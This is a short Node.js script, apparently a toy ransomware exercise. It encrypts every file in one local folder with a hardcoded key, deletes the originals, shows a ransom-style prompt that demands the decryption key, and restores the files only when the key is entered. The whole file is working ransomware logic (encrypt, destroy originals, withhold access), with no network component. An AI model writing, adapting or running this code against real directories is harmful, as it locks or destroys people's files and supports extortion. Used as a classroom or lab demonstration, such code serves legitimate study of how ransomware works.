const encryptor = require("file-encryptor");
const readlineSync = require("readline-sync");
const fs = require("fs");

const key = "BeautifulDisaster";
const altheassecret = "./altheasfolderofsecret/";

const files = fs.readdirSync(altheassecret);
let filesEncrypted = 0;

files.forEach((file) => {
  encryptor.encryptFile(`${altheassecret}${file}`,`${altheassecret}${file}.encrypt`,key,
    function (err) {
      if (err) {
        console.error("Error encrypting file:", err);
        return;
      }
      fs.unlinkSync(`${altheassecret}${file}`);
      filesEncrypted++;
      if (filesEncrypted === files.length) {
        console.log(
          `Your files have been encrypted. If you want to decrypt them, enter the decryption key. Type "exit" to quit.`
        );
        startDecryption();
      }
    }
  );
});

function startDecryption() {
  while (true) {
    const decryptionKey = readlineSync.question("Please Enter The Decryption Key Needed: ");

    if (decryptionKey.toLowerCase() === "exit") {
      console.log("Exiting the process....");
      process.exit(1);
    }

    if (decryptionKey === key) {
      decryptFiles(decryptionKey);
      break;
    } else {
      console.log(
        'Incorrect decryption key. Please try again to continue or type "exit" to quit.'
      );
    }
  }
}

function decryptFiles(decryptionKey) {
  const decryptedfiles = fs.readdirSync(altheassecret);
  let filesDecrypted = 0;

  decryptedfiles.forEach((file) => {
    encryptor.decryptFile(
      `${altheassecret}${file}`,`${altheassecret}${file.replace(".encrypt", "")}`,decryptionKey,
      function (err) {
        if (err) {
          console.error("Error decrypting file:", err);
          return;
        }

        fs.unlinkSync(`${altheassecret}${file}`);
        filesDecrypted++;

        if (filesDecrypted === decryptedfiles.length) {
          console.log("Congratulations, Your Files Have been Decrypted Thank you, Be Careful Next Time.");
          process.exit(1);
        }
      }
    );
  });
}
